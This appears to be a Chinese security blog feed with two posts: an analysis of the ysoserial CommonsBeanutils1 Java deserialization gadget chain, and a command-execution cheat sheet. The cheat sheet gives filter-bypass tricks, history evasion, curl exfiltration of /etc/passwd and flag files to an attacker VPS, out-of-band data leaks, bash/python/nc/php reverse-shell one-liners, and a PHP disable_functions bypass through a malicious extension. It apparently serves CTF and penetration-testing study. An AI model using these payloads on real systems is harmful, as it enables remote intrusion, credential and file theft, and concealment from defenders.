    </summary>
    
    
  </entry>
  
  <entry>
    <title>ysoserial源码分析(1)</title>
    <link href="http://www.tharavel.site/2018/04/27/ysoserial-analysis1.html"/>
    <id>http://www.tharavel.site/2018/04/27/ysoserial-analysis1.html</id>
    <published>2018-04-27T07:21:48.280Z</published>
    <updated>2018-05-11T00:50:12.582Z</updated>
    
    <content type="html"><![CDATA[<p>一直觉得阅读好的代码对个人的编程能力帮助很大，最近在学习java安全，于是选择ysoserial这一个很有名气的工具进行分析，来丰富和扩展自己的见识，在完整地分析完其中的一个payload后，我也确实收获良多。</p>
<p>首先分析CommonsBeanutils1要用到的Gadgets类：</p>
<h3 id="Gadgets-java："><a href="#Gadgets-java：" class="headerlink" title="Gadgets.java："></a>Gadgets.java：</h3><h4 id="createTemplatesImpl函数"><a href="#createTemplatesImpl函数" class="headerlink" title="createTemplatesImpl函数"></a>createTemplatesImpl函数</h4><p>由于CommonsBeanutils1只用到了createTemplatesImpl方法，所以这里只分析这个函数。该函数主要用来将payload动态写入类，再将类写入字节数组并返回。</p>
<p>我们使用该函数时，是createTemplatesImpl(command)的形式，然后会调用<code>createTemplatesImpl ( final String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</code>方法，在该方法里，首先实例化了<code>TemplatesImpl</code>类，之所以使用该类，是因为该类有个字段_bytecodes，可以用来存储对象转化成的字节数组，我们知道如果再将_bytecodes生成java实例，便可方便我们向漏洞程序传payload，而巧的是实现将字节数组转化成java实例的功能在该类中也有相应的实现，综上，<code>TemplatesImpl</code>成为本次利用的类。</p>
<p>接下来就是利用了javassist的一系列类的特性，关于javassist，其实就是一个二方包，和反射功能相似，却比反射更强大，性能开销更低，详细了解可见：<a href="http://ju.outofmemory.cn/entry/79911" target="_blank" rel="external">http://ju.outofmemory.cn/entry/79911</a>。首先创建类池，然后把需要利用的类加载到搜索路径里，使用pool.get方法获取CtClassType类型的StubTransletPayload类，之后通过<code>clazz.makeClassInitializer().insertAfter(cmd);</code>往StubTransletPayload类的class里写入cmd。这里面的关键是makeClassInitializer函数，这个函数的作用返回一个CtConstructor类型的静态初始化器，如果不存在的话会新建一个，存在的话就返回。然后通过CtConstructor类的insertAfter方法写入cmd，接着使用serName方法产生一个随机值赋予CtClass的qualifiedName变量，对于这个变量，在源码注解中有一段说明：</p>
<blockquote>
<pre><code>* If the value of this field is not null, then all class
* files modified by Javassist are saved under the directory
* specified by this variable.  For example, if the value is
* &lt;code&gt;&quot;./debug&quot;&lt;/code&gt;, then all class files are saved
* there.  The directory name must not end with a directory
* separator such as &lt;code&gt;/&lt;/code&gt;.
*
* &lt;p&gt;The default value is null.
</code></pre></blockquote>
<p>每次产生不同的值可以使得每次修改产生的class文件放到不同的目录，从而允许重复exploit。然后修改StubTransletPayload父类为abstTranslet，使用toBytecode方法把类导入字节数组。接着利用反射机制将该字节数组及Gadgets.class生成的字节数组所组成的数组赋值给_bytecodes（这里解释一下，ClassFiles.classAsBytes(Foo.class)操作的作用是找到Foo.class的外部类，这里是Gadgets.class，并将其写入字节数组）。最后的，设置TemplatesImpl的两个属性值（这两个属性值在后续调用链中会作为判断条件等，默认值为null，因此需要赋值），并返回TemplatesImpl的对象。</p>
<h3 id="CommonsBeanutils1分析："><a href="#CommonsBeanutils1分析：" class="headerlink" title="CommonsBeanutils1分析："></a>CommonsBeanutils1分析：</h3><p>首先<code>Gadgets.createTemplatesImpl(command)</code>将command通过利用javassist包动态写入到字节数组中，并赋值给templates对象的_bytecodes属性，然后返回templates对象。</p>
<p>在TemplatesImpl中存在以下调用链：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">TemplatesImpl.getOutputProperties()</div><div class="line">  TemplatesImpl.newTransformer()</div><div class="line">    TemplatesImpl.getTransletInstance()</div><div class="line">      TemplatesImpl.defineTransletClasses()</div><div class="line">        TemplatesImpl.TransletClassLoader</div><div class="line">         Class.newInstance()</div><div class="line">            Runtime.exec()</div></pre></td></tr></table></figure></p>
<p>通过跟踪源码，我们很容易发现上面的调用链，在<code>getTransletInstance</code>方法中部分代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></div><div class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>; <span class="comment">//这就是设置_name值的原因</span></div><div class="line">            <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses(); <span class="comment">//通过ClassLoader加载字节码，存储在_class数组中</span></div><div class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></div><div class="line">            <span class="comment">// class to prevent the GC from collecting them</span></div><div class="line">            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); <span class="comment">//新建实例，触发恶意代码</span></div><div class="line">            translet.postInitialization();</div><div class="line">            translet.setTemplates(<span class="keyword">this</span>);</div><div class="line">            translet.setServicesMechnism(_useServicesMechanism);</div><div class="line">            translet.setAllowedProtocols(_accessExternalStylesheet);</div><div class="line">            <span class="keyword">if</span> (_auxClasses != <span class="keyword">null</span>) &#123;</div><div class="line">                translet.setAuxiliaryClasses(_auxClasses);</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">return</span> translet;</div><div class="line">        &#125;</div><div class="line">        ......</div></pre></td></tr></table></figure>
<p>跟进<code>defineTransletClasses</code>会发现在里面使用了java.lang.ClassLoader.defineClass方法，这个方法我们知道可以从字节数组中读取出class类，而在这里<code>defineTransletClasses</code>方法也是通过defineClass方法来实现字节数组生成java类。接下来的<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code> 则将从字节数组中还原的类实例化，从而触发了恶意代码。</p>
<p>现在条理已经很清晰，只要能够自动触发TemplatesImpl.getOutputProperties()方法执行，我们就能达到目的了。而这里，则利用了BeanComparator比较器来触发执行该方法。</p>
<p>剩下的代码实质上就是把template对象放到PriorityQueue类里。我们来具体分析调用过程：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">final</span> BeanComparator comparator = <span class="keyword">new</span> BeanComparator(<span class="string">"lowestSetBit"</span>);</div><div class="line"></div><div class="line"><span class="comment">// create queue with numbers and basic comparator</span></div><div class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</div><div class="line"><span class="comment">// stub data for replacement later</span></div><div class="line">queue.add(<span class="keyword">new</span> BigInteger(<span class="string">"1"</span>));</div><div class="line">queue.add(<span class="keyword">new</span> BigInteger(<span class="string">"1"</span>));</div><div class="line"></div><div class="line"><span class="comment">// switch method called by comparator</span></div><div class="line">Reflections.setFieldValue(comparator, <span class="string">"property"</span>, <span class="string">"outputProperties"</span>);</div><div class="line"></div><div class="line"><span class="comment">// switch contents of queue</span></div><div class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">"queue"</span>);</div><div class="line">queueArray[<span class="number">0</span>] = templates;</div><div class="line">queueArray[<span class="number">1</span>] = templates;</div><div class="line"></div><div class="line"><span class="keyword">return</span> queue;</div></pre></td></tr></table></figure></p>
<p>我们的反序列化链利用的是PriorityQueue类，利用到的方法如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">PriorityQueue</span><span class="params">(<span class="keyword">int</span> i, Comparator comparator1)</span></span></div><div class="line">&#123;</div><div class="line">    size = <span class="number">0</span>;</div><div class="line">    modCount = <span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span>(i &lt; <span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException();</div><div class="line">    &#125; <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        queue = <span class="keyword">new</span> Object[i];</div><div class="line">        comparator = comparator1;</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream objectinputstream)</span></span></div><div class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</div><div class="line">&#123;</div><div class="line">    objectinputstream.defaultReadObject();</div><div class="line">    objectinputstream.readInt();</div><div class="line">    SharedSecrets.getJavaOISAccess().checkArray(objectinputstream, [Ljava/lang/Object;, size);</div><div class="line">    queue = <span class="keyword">new</span> Object[size];</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</div><div class="line">        queue[i] = objectinputstream.readObject();</div><div class="line"></div><div class="line">    heapify();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>而放入PriorityQueue的对象需要满足两个条件：</p>
<blockquote>
<p>实现readObject方法<br>实现Comparable接口</p>
</blockquote>
<p>之前储存payload方法使用的<code>TemplatesImpl</code>类满足第一个条件，却不满足第二个，怎么办呢，如果我们直接queue.add(templates)，所造成的后果就是生成payload时会抛出异常。经过跟踪代码，我发现还有一个原因导致不能直接add(templates)，add方法调用了offer方法，不断跟踪offer方法的调用发现最终会触发<code>TemplatesImpl.getOutputProperties()</code>，这样就导致我们生成payload的过程中就会执行命令从而导致payload生成失败，这是显然是我们不希望看到的。</p>
<p>所以代码这里首先实例化BeanComparator类，将property设置为<code>lowestSetBit</code>(这是BigInteger的一个可比较属性，这里也可设置为BigInteger类的其他的可比较属性)，接着<code>add(new BigInteger(&quot;1&quot;))</code>，这些都是为了满足这两个条件从而不让代码抛出异常。后面利用反射机制动态修改放入到PriorityQueue的对象，从而绕过了第二个条件的限制。</p>
<p>我们看到代码这里利用反射机制将 Comparator的property 设置为 TemplatesImpl 的属性 outputProperties(在反序列化时会导致触发执行getOutputProperties()方法)，并获取了 PriorityQueue 的内置属性数组 queue，将 templates 按照索引值填入了 queue，然后返回PriorityQueue的实例化对象queue.</p>
<p>至此payload的构成算是完毕，简单看一下payload是如何工作的：</p>
<p>当我们的payload被漏洞程序反序列化时，调用了PriorityQueue的readObject() 函数，整个反序列化调用链如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">ObjectInputStream.readObject</div><div class="line">    PriorityQueue.readObject</div><div class="line">        PriorityQueue.heapify</div><div class="line">            PriorityQueue.siftDown</div><div class="line">                PriorityQueue.siftDownUsingComparator</div><div class="line">                    BeanComparator.compare</div><div class="line">                        PropertyUtils.getProperty( o1, property )</div><div class="line">                            TemplatesImpl.getOutputProperties</div><div class="line">                                TemplatesImpl.newTransformer</div><div class="line">                                    TemplatesImpl.getTransletInstance</div><div class="line">                                      TemplatesImpl.defineTransletClasses</div><div class="line">                                        TemplatesImpl.TransletClassLoader.defineClass</div><div class="line">                                        Class.newInstance()</div><div class="line">                                            Runtime.exec()</div></pre></td></tr></table></figure></p>
<p>通过该调用链，顺利执行了命令。</p>
<p>这次分析先到这里，后面会抽空把其他payload分析一遍。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一直觉得阅读好的代码对个人的编程能力帮助很大，最近在学习java安全，于是选择ysoserial这一个很有名气的工具进行分析，来丰富和扩展自己的见识，在完整地分析完其中的一个payload后，我也确实收获良多。&lt;/p&gt;
&lt;p&gt;首先分析CommonsBeanutils1要用到
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>各种命令执行总结</title>
    <link href="http://www.tharavel.site/2018/03/23/command-execute.html"/>
    <id>http://www.tharavel.site/2018/03/23/command-execute.html</id>
    <published>2018-03-23T08:04:37.753Z</published>
    <updated>2018-04-18T09:06:09.553Z</updated>
    
    <content type="html"><![CDATA[<p>好久没更博客了，就把笔记里的东西整理一下发出来，里面还是有一些少见的trick的~<br>本文持续更新~</p>
<hr>
<p>首先说一个小trick:<br>在渗透过程中，我们常常需要清理痕迹，而在history中会记录命令执行历史，我们可以清除history。也有一个简单方法使得在终端执行的命令不被记录，实现方法很简单，在执行的命令前添加<code>空格</code>即可，该方法仅限在debain内核的系统中。</p>
<h3 id="0X01-linux命令执行"><a href="#0X01-linux命令执行" class="headerlink" title="0X01 linux命令执行"></a>0X01 <strong>linux命令执行</strong></h3><h4 id="如何判断是否是linux命令执行"><a href="#如何判断是否是linux命令执行" class="headerlink" title="如何判断是否是linux命令执行"></a><strong>如何判断是否是linux命令执行</strong></h4><p>可以使用的判断方法有&amp;+命令或|+命令，如：</p>
<blockquote>
<p>ping &amp;id 或 ping |id<br>curl &amp;id 或 curl |id</p>
</blockquote>
<p>通过返回结果可判断是否是命令执行，同时这也是在前面有ping和curl的情况下进行命令执行的一种方法</p>
<h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a><strong>读取文件</strong></h4><p>当cat被过滤时，可尝试一下几种读取文件方法：</p>
<blockquote>
<p>strings flag.php<br>echo &gt; flag.php<br>uniq -c flag.php<br>bash -v flag.php<br>rev flag.php</p>
</blockquote>
<p>或者使用curl上传到vps，并在vps上开启监听进行读取：  </p>
<blockquote>
<p>curl -T flag.php “<a href="http://192.168.x.xxx:6666" target="_blank" rel="external">http://192.168.x.xxx:6666</a>“<br>或curl “<a href="http://vps/" target="_blank" rel="external">http://vps/</a>“ –data-binary @/etc/passwd<br>…<br>在vps上：<br>nc -lvpn 6666</p>
</blockquote>
<h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a><strong>空格绕过</strong></h4><p>如果过滤了空格，常用的绕过方法有</p>
<blockquote>
<p>$IFS<br>{ls,-l}<br>cat%09flag.php<br>cat &lt; flag.php<br>cat&lt;&gt;flag.php</p>
</blockquote>
<p>其中后面两个适用于读取文件,而前两个则可完全代替空格，中间的%09需在php环境下，为了避免$IFS与后面的字符串写在一起被误解，需要分隔开$IFS，常用的方法有一下几种：</p>
<blockquote>
<p>${IFS}<br>$IFS$9<br>$IFS\</p>
</blockquote>
<p>这里解释一下，$9是linux系统shell进程的第九个参数，始终为空字符串</p>
<h4 id="绕过"><a href="#绕过" class="headerlink" title="/绕过"></a><strong>/绕过</strong></h4><blockquote>
<p>${PATH:0:1}  // ${str:a:b}表示提取字符串a开始的b个字符<br>  ${PATH%%u*}</p>
</blockquote>
<p>上面两个都能得到’/‘字符</p>
<p>利用同样的思路(即字符串截取)，我们可以得到更多~</p>
<p><a href="https://www.z4a.net/image/Yzkfp" target="_blank" rel="external"><img src="https://www.z4a.net/images/2018/01/31/image.png" alt="image.png"></a></p>
<p>当然，一切都要建立在没有过滤$,{和}的基础上</p>
<h4 id="加号绕过"><a href="#加号绕过" class="headerlink" title="加号绕过"></a><strong>加号绕过</strong></h4><blockquote>
<p>$PS4</p>
</blockquote>
<h4 id="大于号绕过"><a href="#大于号绕过" class="headerlink" title="大于号绕过"></a><strong>大于号绕过</strong></h4><blockquote>
<p>$PS2</p>
</blockquote>
<h4 id="对某些命令的过滤"><a href="#对某些命令的过滤" class="headerlink" title="对某些命令的过滤"></a><strong>对某些命令的过滤</strong></h4><p>当某些命令被正则匹配的方式过滤时，可以考虑的绕过方法如下：</p>
<p>字符串拼接：  </p>
<blockquote>
<p>a=un;b=ame;$a$b<br>若’;’被过滤，还可用%0a代替分号<br>a=un%0ab=ame%0a$a$b  </p>
</blockquote>
<p>字符串截取：</p>
<blockquote>
<p>root@xxx:~# echo ${PATH:9:1}${PATH:11:1}<br>ls<br>root@xxx:~# ${PATH:9:1}${PATH:11:1}<br>Desktop  公共  模板  视频  图片  文档  下载  音乐  桌面  </p>
<p>如果冒号被过滤，可以使用：<br>root@xxx:~# $(expr substr $PATH 10 1)$(expr substr $PATH 12 1)<br>Desktop  公共  模板  视频  图片  文档  下载  音乐  桌面  </p>
</blockquote>
<p>base64编码：  </p>
<blockquote>
<p>root@xxx:~# echo “dW5hbWU=” | base64 -d |bash<br>root</p>
</blockquote>
<p>xxd（16进制）:  </p>
<blockquote>
<p>root@xxx:~# printf “77686f616d69” | xxd -r -p | bash<br>root</p>
</blockquote>
<p>利用反斜线来绕过:</p>
<blockquote>
<p>una\me  </p>
</blockquote>
<p>插入空字符串：  </p>
<blockquote>
<p>u``name<br>u’’name<br>u””name<br>u${xxx}name</p>
</blockquote>
<h4 id="对文件名的过滤"><a href="#对文件名的过滤" class="headerlink" title="对文件名的过滤"></a><strong>对文件名的过滤</strong></h4><p>可用正则绕过，如flag被过滤的情况下读取flag.php，则可以使用：cat fla*来绕过</p>
<h4 id="多条命令执行"><a href="#多条命令执行" class="headerlink" title="多条命令执行"></a><strong>多条命令执行</strong></h4><p>常见于curl/ping x.x.x.x,且x.x.x.x可控，此时可利用管道符，逻辑运算符，分号及%0a来绕过</p>
<blockquote>
<p>ping x.x.x.x |ls<br>ping x.x.x.x ||ls<br>ping x.x.x.x&amp;ls<br>ping x.x.x.x&amp;&amp;ls<br>ping x.x.x.x;ls   </p>
</blockquote>
<p>在地址栏执行时可以利用回车的url编码%0a绕过：<br>ping x.x.x.x%0als </p>
<h4 id="对回显限制"><a href="#对回显限制" class="headerlink" title="对回显限制"></a><strong>对回显限制</strong></h4><p>如果对回显中的特殊字符进行检测，则可以通过base64或16进制编码绕过，如</p>
<blockquote>
<p>ls|base64</p>
</blockquote>
<h4 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a><strong>无回显</strong></h4><p>可尝试构建一条带外信道提取数据，如：</p>
<blockquote>
<p>curl (你的ip)/?`whoami` 然后查看Apache日志<br>curl `whoami`.3eea625fcaceaafc7db2.d.zhack.ca (该网站能直接返回接受的数据)<br>S<br>命令执行返回的结果不能包含空格和回车，可以通过base64编码或者如<code>cat flag.php|sed &#39;s/[[:space:]]//g&#39;</code>来清除空格,回车替换可以用<code>sed &#39;:a;N;s/\n/*/;ba&#39;</code>，这样就将回车换成了<code>*</code>S号 (因为sed默认是逐行处理数据，所以sed默认情况下不会处理到换行符，直接用<code>sed s/\n/*/g</code>不可行)</p>
</blockquote>
<p>如果不想编码，还可以将数据附在HTTP头，如<code>curl &quot;http://vpsip/&quot; -H &quot;User-Agent: $(id)&quot;</code><br>或者post数据：<code>id | curl &quot;http://vpsip/&quot; --data-binary @-</code></p>
<h3 id="0X02-常用shell反弹"><a href="#0X02-常用shell反弹" class="headerlink" title="0X02 常用shell反弹"></a>0X02 <strong>常用shell反弹</strong></h3><p>网上有很多文章总结了，这里简单列举几个:  </p>
<blockquote>
<p>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</p>
<p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p>
<p>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f </p>
<p>php -r ‘$sock=fsockopen(“10.0.0.1”,1234);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p>
</blockquote>
<h3 id="0X03-Python命令执行"><a href="#0X03-Python命令执行" class="headerlink" title="0X03 Python命令执行"></a>0X03 <strong>Python命令执行</strong></h3><p>下面是python中可用于命令执行的模块</p>
<blockquote>
<p>os<br>subprocess<br>commands<br>platform<br>timeit<br>pickle<br>pydoc</p>
</blockquote>
<p>举例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">import</span> timeit</div><div class="line">timeit.timeit(<span class="string">"__import__('os').system('')"</span>, number=<span class="number">1</span>)</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> platform</div><div class="line"><span class="keyword">print</span> platform.popen(<span class="string">'id'</span>, mode=<span class="string">'r'</span>, bufsize=<span class="number">-1</span>).read()</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line">os.system()  </div><div class="line"><span class="keyword">print</span> os.popen().read()</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> subprocess</div><div class="line">subprocess.call([<span class="string">"cmd"</span>,<span class="string">"arg1"</span>,<span class="string">"arg2"</span>],shell=<span class="keyword">True</span>)</div><div class="line">subprocess.Popen(<span class="string">'ls'</span>, shell=<span class="keyword">True</span>)</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> commands</div><div class="line"><span class="keyword">print</span> commands.getoutput(<span class="string">'ls'</span>)</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pydoc</div><div class="line">pydoc.pipepager(<span class="keyword">None</span>,<span class="string">'id'</span>)</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pickle</div><div class="line">pickle.loads(<span class="string">"cos\nsystem\n(S'ifconfig'\ntR."</span>)</div></pre></td></tr></table></figure>
<p>当常见的os,subprocess,commands等被过滤时，除了可尝试用另外几个模块来实现命令执行外，也可灵活使用rot13编码绕过：<br><a href="https://www.z4a.net/image/YzPIa" target="_blank" rel="external"><img src="https://www.z4a.net/images/2018/01/31/imagedba0f9c8d575d043.md.png" alt="imagedba0f9c8d575d043.md.png"></a></p>
<p>其中，有一点需要注意的是，subprocess中的shell如果shell=True的话，curl命令是被Bash(Sh)启动，所以支持shell语法。 如果shell=False的话，启动的是可执行程序本身，后面的参数不再支持shell语法(即执行的命令不能带有参数)。</p>
<h4 id="pydoc更多玩法"><a href="#pydoc更多玩法" class="headerlink" title="pydoc更多玩法"></a>pydoc更多玩法</h4><p>当系统中PAGER环境变量被设置时，pydoc模块将使用该值作为导入文档，这一点可以被用来执行任意命令，比如：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="number">1.</span>py：</div><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">import</span> pydoc</div><div class="line">pydoc.pager(<span class="string">""</span>)</div></pre></td></tr></table></figure></p>
<p>此时在命令行:</p>
<blockquote>
<p>$ export PAGER=”whoami”<br>$ python 1.py</p>
</blockquote>
<p>此时命令行会显示结果: <code>root</code></p>
<h4 id="python沙盒绕过"><a href="#python沙盒绕过" class="headerlink" title="python沙盒绕过"></a>python沙盒绕过</h4><p>简单的沙盒的绕过方法可以通过编码，如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#coding: rot_13</div><div class="line">&apos;vzcbeg bf&apos;  //import os</div></pre></td></tr></table></figure></p>
<p>有篇文章详细介绍了python沙盒绕过的各种方法：<a href="https://xianzhi.aliyun.com/forum/topic/52" target="_blank" rel="external">Python沙箱逃逸的n种姿势</a>，这篇文章讲的很全面，这里就不再重述</p>
<h3 id="0X04-PHP命令执行"><a href="#0X04-PHP命令执行" class="headerlink" title="0X04 PHP命令执行"></a>0X04 <strong>PHP命令执行</strong></h3><p>常用的php环境下命令执行操作汇总如下：  </p>
<p>获取当前文件路径</p>
<blockquote>
<p>echo dirname(__FILE__) ;<br>echo getcwd();</p>
</blockquote>
<p>获取同目录下的所有文件名称</p>
<blockquote>
<p>echo var_dump(glob(‘./*’));<br>system(“ls”)/system(“dir”)/system–&gt;可换成执行系统命令的函数;</p>
</blockquote>
<p>读取某个文件的内容</p>
<blockquote>
<p>echo file_get_contents(“flag.php”);<br>echo fgets(fopen(“flag.php”,”r”));<br>show_source(“flag.php”);<br>echo fread(fopen(“flag.php”,”r”),filesize(“flag.php”));<br>echo var_dump(file(“flag.php”));<br>copy(“flag.php”,”daiker.txt”);<br>include ‘php://filter/read=convert.base64-encode/resource=flag.php’;<br>highlight_file(“flag.php”);</p>
</blockquote>
<p>php配置文件里面有个disable_functions = …，可以用来禁止某些php函数，若常见能够执行系统命令的函数被禁用，又如何命令执行呢<br>首先看看能够执行命令的函数：  </p>
<blockquote>
<p>system<br>assert<br>passthru<br>exec<br>pcntl_exec<br>shell_exec<br>popen<br>proc_open</p>
</blockquote>
<p>由于函数未禁用全，从而导致命令执行的案例也是很多的，所以当一些函数被禁止时，可尝试其他一些函数</p>
<p>当以上函数都被过滤时，可以使用下面几种方法：</p>
<h4 id="拓展库绕过"><a href="#拓展库绕过" class="headerlink" title="拓展库绕过"></a>拓展库绕过</h4><p>Linux下可通过编译拓展库进行绕过，在得知目标服务器的php版本后，本地下载相同版本的php源码包，并生成一个精心构造的拓展库，再使用dl函数调用拓展库即可实现命令执行，具体操作如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">下载好php源码包后：</div><div class="line">tar zxvf php-5.3.10.tar.gz</div><div class="line">cd php-5.3.10/ext</div><div class="line">./ext_skel --extname=shell  //生成名为shell的拓展库</div><div class="line">cd shell</div><div class="line">vi config.m4</div><div class="line"></div><div class="line">将以下三行前面的dnl去掉，然后保存退出：</div><div class="line">PHP_ARG_WITH(dl, for dl support,</div><div class="line">Make sure that the comment is aligned:</div><div class="line">[  --with-dl             Include dl support])</div><div class="line"></div><div class="line">whereis phpize          //找出phpize路径</div><div class="line">/usr/local/bin/phpize     // 运行phpize</div><div class="line">vi shell.c</div><div class="line"></div><div class="line">在</div><div class="line">if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, &quot;s&quot;, &amp;arg, &amp;arg_len) == FAILURE) &#123;</div><div class="line">    return;</div><div class="line">&#125;</div><div class="line">这一行下面添加：system(arg)  </div><div class="line"></div><div class="line">然后：</div><div class="line">whereis php-config  //找出php-config的路径</div><div class="line">./configure --whith-php-config=php-config路径</div><div class="line">make</div><div class="line">make install</div></pre></td></tr></table></figure></p>
<p>将生成的拓展库文件/usr/local/lib/php/extensions/no-debug-non-zts-20180130/shell.so拷贝到extension_dir目录下，若extension_dir目录无写权限则先写入任意目录 , 在payload中用../../来实现调用<br>payload如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">dl(<span class="string">"shell.so"</span>);  <span class="comment">//shell.so在extension_dir目录，如不在则用../../来实现调用</span></div><div class="line">confirm_dl_compiled(<span class="string">"$_GET[a]&gt;flag.txt"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>cat flag.txt便可看到命令执行结果，当然，如果dl函数被禁用，该方法便无效了</p>
